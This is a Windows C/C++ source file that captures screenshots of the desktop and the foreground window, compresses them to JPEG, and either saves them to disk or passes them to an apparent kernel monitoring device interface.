#include "screenshot.h"
#include "debug.h"
#include "gdiplus.h"
#include "jpge.h"
#include "device.h"
#include <stdio.h>

typedef struct _BITMAP_DATA {
	BITMAP bmp;
	BITMAPINFOHEADER bmInfoHeader;
	BITMAPFILEHEADER bmFileHeader;
	char *bits;
	DWORD bitsSize;
} BITMAP_DATA, *PBITMAP_DATA;

VOID
	BitmapDataInit(PBITMAP_DATA bmData)
{
	memset(bmData, 0, sizeof(BITMAP_DATA));
}

VOID
	BitmapDataRelease(PBITMAP_DATA bmData)
{
	if (bmData->bits != NULL)
		HeapFree(GetProcessHeap(), 0, bmData->bits);
	memset(bmData, 0, sizeof(BITMAP_DATA));
}

BOOL BitmapDataSet(HDC hdcMemDC, HBITMAP hbmScreen, PBITMAP_DATA bmData)
{
	BOOL Result = FALSE;

	if (0 == GetObject(hbmScreen, sizeof(BITMAP), &bmData->bmp)) {
		DebugPrint("cant get bitmap from hbm");
		goto done;
	}

	bmData->bmInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmData->bmInfoHeader.biWidth = bmData->bmp.bmWidth;
	bmData->bmInfoHeader.biHeight = bmData->bmp.bmHeight;
	bmData->bmInfoHeader.biPlanes = 1;
	bmData->bmInfoHeader.biBitCount = 32;
	bmData->bmInfoHeader.biCompression = BI_RGB;
	bmData->bmInfoHeader.biSizeImage = 0;
	bmData->bmInfoHeader.biXPelsPerMeter = 0;
	bmData->bmInfoHeader.biYPelsPerMeter = 0;
	bmData->bmInfoHeader.biClrUsed = 0;
	bmData->bmInfoHeader.biClrImportant = 0;

	bmData->bitsSize = 4 * bmData->bmp.bmWidth * bmData->bmp.bmHeight;

	bmData->bits = (char *)HeapAlloc(GetProcessHeap(), 0, bmData->bitsSize);
	if (bmData->bits == NULL) {
		DebugPrint("failed to alloc %x bytes\n", bmData->bitsSize);
		goto done;
	}

	DWORD dwError;
	// Gets the "bits" from the bitmap and copies them into a buffer 
	// which is pointed to by lpbitmap.
	dwError = GetDIBits(hdcMemDC, hbmScreen, 0,
		(UINT)bmData->bmp.bmHeight,
		bmData->bits,
		(BITMAPINFO *)&bmData->bmInfoHeader, DIB_RGB_COLORS);
	if (dwError == ERROR_INVALID_PARAMETER) {
		DebugPrint("GetDIBits error=%x\n", dwError);
		goto done;
	}

	if (dwError == 0) {
		DebugPrint("GetDIBits error=%x\n", dwError);
		goto done;
	}

	// Add the size of the headers to the size of the bitmap to get the total file size
	DWORD dwSizeofDIB = bmData->bitsSize + sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);

	//Offset to where the actual bitmap bits start.
	bmData->bmFileHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER)+(DWORD)sizeof(BITMAPINFOHEADER);

	//Size of the file
	bmData->bmFileHeader.bfSize = dwSizeofDIB;

	//bfType must always be BM for Bitmaps
	bmData->bmFileHeader.bfType = 0x4D42; //BM  
	Result = TRUE;

done:
	if (!Result) {
		BitmapDataRelease(bmData);
	}

	return Result;
}

DWORD 
	BitmapDataSaveToFile(WCHAR *FileName, PBITMAP_DATA bmData)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD error = ERROR_ACCESS_DENIED;

	DWORD dwBytesWritten = 0;

	hFile = CreateFile(FileName,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		error = GetLastError();
		DebugPrint("CreateFile failed filename=%ws, error=%d\n", FileName, error);
		goto done;
	}

	if (!WriteFile(hFile, (LPSTR)&bmData->bmFileHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL)) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	if (sizeof(BITMAPFILEHEADER) != dwBytesWritten) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	if (!WriteFile(hFile, (LPSTR)&bmData->bmInfoHeader, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL)) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	if (sizeof(BITMAPINFOHEADER) != dwBytesWritten) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	if (!WriteFile(hFile, (LPSTR)bmData->bits, bmData->bitsSize, &dwBytesWritten, NULL)) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	if (bmData->bitsSize != dwBytesWritten) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	error = ERROR_SUCCESS;

done:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if ((error != ERROR_SUCCESS) && (hFile != INVALID_HANDLE_VALUE)) {
		DeleteFile(FileName);
	}

	return error;
}



BOOL CaptureAnImage(HWND hWnd, PBITMAP_DATA bmData, PRECT ClientRect)
{
	HDC hdcScreen = NULL;
	HDC hdcMemDC = NULL;
	HBITMAP hbmScreen = NULL;
	HGDIOBJ hOldObj = NULL;
	BOOL hOldObjValid = FALSE;
	BOOL Result = FALSE;

	HDC hdcMemDC2 = NULL;
	HBITMAP hbmScreen2 = NULL;
	HGDIOBJ hOldObj2 = NULL;
	BOOL hOldObjValid2 = FALSE;
	HDC hdcResult = NULL;
	HBITMAP hbmResult = NULL;
	RECT wRect;

	DebugPrint("CaptureAnImage wnd=%x\n", hWnd);

	// Retrieve the handle to a display device context for the client 
	// area of the window. 
	hdcScreen = GetDC(hWnd);
	if (hdcScreen == NULL) {
		DebugPrint("GetDC() failed\n");
		goto done;
	}
	
	// Create a compatible DC which is used in a BitBlt from the window DC
	hdcMemDC = CreateCompatibleDC(hdcScreen);
	if (!hdcMemDC) {
		DebugPrint("CreateCompatibleDC failed\n");
		goto done;
	}
	
	if (!GetWindowRect(hWnd, &wRect)) {
		DebugPrint("GetWindowRect() failed, error=%d\n", GetLastError());
		goto done;
	}

	int cx = wRect.right - wRect.left;
	int cy = wRect.bottom - wRect.top;

	// Create a compatible bitmap from the Window DC
	hbmScreen = CreateCompatibleBitmap(hdcScreen, cx, cy);
	if (!hbmScreen) {
		DebugPrint("CreateCompatibleBitmap failed\n");
		goto done;
	}

	// Select the compatible bitmap into the compatible memory DC.
	hOldObj = SelectObject(hdcMemDC, hbmScreen);
	hOldObjValid = TRUE;

	// Bit block transfer into our compatible memory DC.
	if (!BitBlt(hdcMemDC,
		0, 0,
		cx, cy,
		hdcScreen,
		0, 0,
		SRCCOPY|CAPTUREBLT))
	{
		DebugPrint("BitBlt failed\n");
		goto done;
	}
	
	if (ClientRect != NULL) {
		hdcMemDC2 = CreateCompatibleDC(hdcMemDC);
		if (!hdcMemDC2) {
			DebugPrint("CreateCompatibleDC failed2\n");
			goto done;
		}
		int cx2 = ClientRect->right - ClientRect->left;
		int cy2 = ClientRect->bottom - ClientRect->top;

		// Create a compatible bitmap from the Window DC
		hbmScreen2 = CreateCompatibleBitmap(hdcMemDC, cx2, cy2);
		if (!hbmScreen2) {
			DebugPrint("CreateCompatibleBitmap failed2\n");
			goto done;
		}

		hOldObj2 = SelectObject(hdcMemDC2, hbmScreen2);
		hOldObjValid2 = TRUE;
		
		if (!BitBlt(hdcMemDC2,
			0, 0,
			cx2, cy2,
			hdcMemDC,
			ClientRect->left, ClientRect->top,
			SRCCOPY | CAPTUREBLT))
		{
			DebugPrint("BitBlt failed2\n");
			goto done;
		}
		hbmResult = hbmScreen2;
		hdcResult = hdcMemDC2;
	} else {
		hbmResult = hbmScreen;
		hdcResult = hdcMemDC;
	}

	if (!BitmapDataSet(hdcResult, hbmResult, bmData)) {
		DebugPrint("BitmapDataSet failed\n");
		goto done;
	}
	
	Result = TRUE;
done:

	if (hbmScreen2 != NULL)
		DeleteObject(hbmScreen2);

	if (hdcMemDC2 != NULL) {
		if (hOldObjValid2)
			SelectObject(hdcMemDC2, hOldObj2);
		DeleteObject(hdcMemDC2);
	}

	if (hbmScreen != NULL)
		DeleteObject(hbmScreen);
	
	if (hdcMemDC != NULL) {
		if (hOldObjValid)
			SelectObject(hdcMemDC, hOldObj);
		DeleteObject(hdcMemDC);
	}

	if (hdcScreen != NULL)
		ReleaseDC(hWnd, hdcScreen);

	return Result;
}



PWCHAR GenScreenShotName(WCHAR *FileNamePrefix, WCHAR *FileExt)
{
	PWCHAR FileName = NULL;
	DWORD sessionId = -1;
	DWORD pid = GetCurrentProcessId();
	ULONG numChars = 0x100;

	if (!ProcessIdToSessionId(pid, &sessionId)) {
		DebugPrint("ProcessIdToSessionId failed err=%d\n", GetLastError());
	}
	
	FileName = (PWCHAR)malloc(numChars*sizeof(WCHAR));
	if (FileName == NULL) {
		DebugPrint("malloc for fileName failed\n");
		return NULL;
	}

	SYSTEMTIME st;
	GetSystemTime(&st);

	//_snwprintf_s(FileName, numChars, _TRUNCATE, L"%ws\\%ws_s%u_t%02d_%02d_%02d%ws", L"\\\\?\\C:\\test", FileNamePrefix, sessionId,
	//	st.wHour, st.wMinute, st.wSecond, FileExt);
	_snwprintf_s(FileName, numChars, _TRUNCATE, L"%ws\\%ws_s%u%ws", L"\\\\?\\C:\\test", FileNamePrefix, sessionId, FileExt);

	return FileName;
}

char *BitsBGRtoRGB(char *src, int width, int height)
{
	char *dst = (char *)HeapAlloc(GetProcessHeap(), 0, 4*width*height);
	if (!dst)
		return NULL;

	for (int x = 0; x < width; x++) {
		for (int y = 0; y < height; y++) {

			char *p_src = &src[4*((height - y - 1) * width + x)];
			char *p_dst = &dst[4*(y * width + x)];

			p_dst[0] = p_src[2]; // red
			p_dst[1] = p_src[1]; // green
			p_dst[2] = p_src[0]; // blue
			p_dst[3] = p_src[3]; // alpha
		}
	}

	return dst;
}

void *
	BitmapDataCompressJPG(PBITMAP_DATA bmData, ULONG *pSize)
{
	jpge::params params;
	params.m_quality = 90;
	params.m_subsampling = static_cast<jpge::subsampling_t>(3);
	params.m_two_pass_flag = 1;
	int width = bmData->bmInfoHeader.biWidth, height = bmData->bmInfoHeader.biHeight;
	void *resultBuf = NULL;
	BOOL Result = FALSE;
	
	char *bits = BitsBGRtoRGB(bmData->bits, width, height);
	if (bits == NULL) {
		DebugPrint("BitsBGRtoRGB faileed\n");
		goto cleanup;
	}

	int buf_size = width * height * 1; // allocate a buffer that's hopefully big enough (this is way overkill for jpeg)
	if (buf_size < 1024)
		buf_size = 1024;

	void *pBuf = HeapAlloc(GetProcessHeap(), 0, buf_size);
	if (!pBuf) {
		DebugPrint("Alloc size=%d failed\n", buf_size);
		goto cleanup;
	}

	const int req_comps = 4; // request RGB image

	if (!jpge::compress_image_to_jpeg_file_in_memory(pBuf, buf_size, width, height, req_comps, (jpge::uint8 *)bits, params)) {
		DebugPrint("compress_image_to_jpeg_file_in_memory failed\n");
		goto cleanup;
	}

	resultBuf = (char *)HeapAlloc(GetProcessHeap(), 0, buf_size);
	if (!resultBuf) {
		DebugPrint("Alloc size=%d failed2\n", buf_size);
		goto cleanup;
	}

	memcpy(resultBuf, pBuf, buf_size);
	Result = TRUE;

cleanup:
	if (pBuf != NULL)
		HeapFree(GetProcessHeap(), 0, pBuf);

	if (bits != NULL)
		HeapFree(GetProcessHeap(), 0, bits);

	if (!Result) {
		if (resultBuf != NULL) {
			HeapFree(GetProcessHeap(), 0, resultBuf);
		}
		resultBuf = NULL;
		*pSize = 0;
	} else {
		*pSize = buf_size;
	}

	return resultBuf;
}

DWORD
SaveDataInFile(WCHAR *FileName, void *data, ULONG size)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	DWORD error = ERROR_ACCESS_DENIED;

	DWORD dwBytesWritten = 0;

	hFile = CreateFile(FileName,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		error = GetLastError();
		DebugPrint("CreateFile failed filename=%ws, error=%d\n", FileName, error);
		goto done;
	}

	if (!WriteFile(hFile, data, size, &dwBytesWritten, NULL)) {
		DebugPrint("Failed to write into file");
		goto done;
	}

	error = ERROR_SUCCESS;

done:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);

	if ((error != ERROR_SUCCESS) && (hFile != INVALID_HANDLE_VALUE)) {
		DeleteFile(FileName);
	}

	return error;
}

VOID
	DoScreenShot(HWND hWnd, WCHAR *FileNamePrefix)
{
	HWND hWndDesk = GetDesktopWindow();
	BITMAP_DATA bmData;
	PRECT pClientRect = NULL;
	RECT wRect;
	PWCHAR FileNameBMP = NULL, FileNameJPG = NULL;

	if (hWnd != hWndDesk) {
		if (!GetWindowRect(hWnd, &wRect)) {
			DebugPrint("GetWindowRect\n");
			goto done;
		}
		pClientRect = &wRect;
	}
	
	BitmapDataInit(&bmData);
	if (!CaptureAnImage(hWndDesk, &bmData, pClientRect)) {
		DebugPrint("cant CaptureAnImage");
		goto done;
	}
	
	void *pData = NULL;
	ULONG dataSize = 0;

	pData = BitmapDataCompressJPG(&bmData, &dataSize);
	if (pData == NULL) {
		DebugPrint("BitmapDataCompressJPG failed\n");
		goto done;
	}
	
	FileNameJPG = GenScreenShotName(FileNamePrefix, L".jpg");
	if (FileNameJPG == NULL) {
		DebugPrint("GenScreenShotName failed\n");
		goto done;
	}

	FileNameBMP = GenScreenShotName(FileNamePrefix, L".bmp");
	if (FileNameBMP == NULL) {
		DebugPrint("GenScreenShotName failed\n");
		goto done;
	}

	SaveDataInFile(FileNameJPG, pData, dataSize);
	BitmapDataSaveToFile(FileNameBMP, &bmData);

done:
	if (FileNameBMP != NULL)
		free(FileNameBMP);
	
	if (FileNameJPG != NULL)
		free(FileNameJPG);

	BitmapDataRelease(&bmData);
}

int
DoScreenShot2(HWND hWnd, void **ppData, ULONG *pDataSize)
{
	HWND hWndDesk = GetDesktopWindow();
	BITMAP_DATA bmData;
	PRECT pClientRect = NULL;
	RECT wRect;
	int res = -1;

	*ppData = NULL;
	*pDataSize = 0;

	if (hWnd != hWndDesk) {
		if (!GetWindowRect(hWnd, &wRect)) {
			DebugPrint("GetWindowRect\n");
			res = -1;
			goto done;
		}
		pClientRect = &wRect;
	}

	BitmapDataInit(&bmData);
	if (!CaptureAnImage(hWndDesk, &bmData, pClientRect)) {
		DebugPrint("cant CaptureAnImage");
		res = -1;
		goto done;
	}

	void *pData = NULL;
	ULONG dataSize = 0;

	pData = BitmapDataCompressJPG(&bmData, &dataSize);
	if (pData == NULL) {
		DebugPrint("BitmapDataCompressJPG failed\n");
		res = -1;
		goto done;
	}
	*ppData = pData;
	*pDataSize = dataSize;
	res = 0;

done:
	BitmapDataRelease(&bmData);
	return res;
}

VOID
	CaptureScreenCallback()
{

	DWORD sessionId = -1;

	if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) {
		DebugPrint("ProcessIdToSessionId failed err=%d\n", GetLastError());
	}

	HWND hWndDesk = GetDesktopWindow();
	if (hWndDesk != NULL) {
		void *data = NULL;
		unsigned long dataSize = 0;

		if (!DoScreenShot2(hWndDesk, &data, &dataSize)) {
			DWORD dwError;
			dwError = DeviceScreenShot((char *)data, dataSize, sessionId, KMON_SCREENSHOT_SCREENSHOT_TYPE);
			if (dwError != ERROR_SUCCESS) {
				DebugPrint("DeviceScreenShot failed with err=%d\n", dwError);
			}
			HeapFree(GetProcessHeap(), 0, data);
		}
	}

	HWND hWndForeground = GetForegroundWindow();
	if (hWndForeground != NULL) {
		void *data = NULL;
		unsigned long dataSize = 0;

		if (!DoScreenShot2(hWndForeground, &data, &dataSize)) {
			DWORD dwError = DeviceScreenShot((char *)data, dataSize, sessionId, KMON_SCREENSHOT_USERWINDOW_TYPE);
			if (dwError != ERROR_SUCCESS) {
				DebugPrint("DeviceUserWindow failed with err=%d\n", dwError);
			}
			HeapFree(GetProcessHeap(), 0, data);
		}
	}
}

